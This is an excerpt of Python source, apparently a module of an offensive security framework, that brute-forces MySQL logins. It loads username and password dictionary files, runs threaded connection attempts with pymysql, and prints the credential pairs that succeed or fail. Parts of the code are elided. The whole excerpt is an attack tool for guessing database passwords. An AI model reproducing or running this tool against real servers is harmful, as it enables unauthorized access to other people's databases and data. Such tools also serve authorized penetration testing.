...
class Brute_mysql(Base_module):
    ...
    def __init__(self):
        options = [
            ...
            ['username', '/', '用户名'],
            ['username_file','mysql_username.txt', '用户名字典(绝对路径)(username填写则本项不生效)'],
            ['port', '3306', 'mysql端口'],
            ['password','/','密码'],
            ['password_file','mysql_password.txt', '密码字典(绝对路径)(password填写则本项不生效)'],
            ['thread', '5', '线程数'],
        ]
    ...
    def start(self):
        ...
        if self.variables['username'] == '/':
            if self.variables['username_file'] == 'mysql_username.txt':
                username_file = 'dict/mysql_username.txt'
            else:
                username_file = self.variables['username_file']
        else:
            with open('dict/mysql_temp_username.txt', 'w') as f:
                f.write(self.variables['username'])
                f.close()
            username_file = 'dict/mysql_temp_username.txt'

        if self.variables['password'] == '/':
            if self.variables['password_file'] == 'mysql_password.txt':
                password_file = 'dict/mysql_password.txt'
            else:
                password_file = self.variables['password_file']
        else:
            with open('dict/mysql_temp_password.txt', 'w') as f:
                f.write(self.variables['password'])
                f.close()
            password_file = 'dict/mysql_temp_password.txt'
    ...
    def thread_mysql(self):  # 线程
        while True:
            ...
            try:
                ...
                print(Fore.GREEN + '[+]' + time.strftime('%H:%M:%S', time.localtime()) + ' mysql成功 %s -- >%s : %s' % (
                ...
                self.lock.acquire()  # 加锁
                print(Fore.RED + '[-]' + time.strftime('%H:%M:%S', time.localtime()) + ' mysql错误 %s --> %s : %s' % (
                self.host, self.user, password) + Fore.RESET)
                self.lock.release()  # 解锁
    ...
    def connect(self,host,port,user,password):
        s = pymysql.connect(host,user,password,'mysql',port)
        s.close()
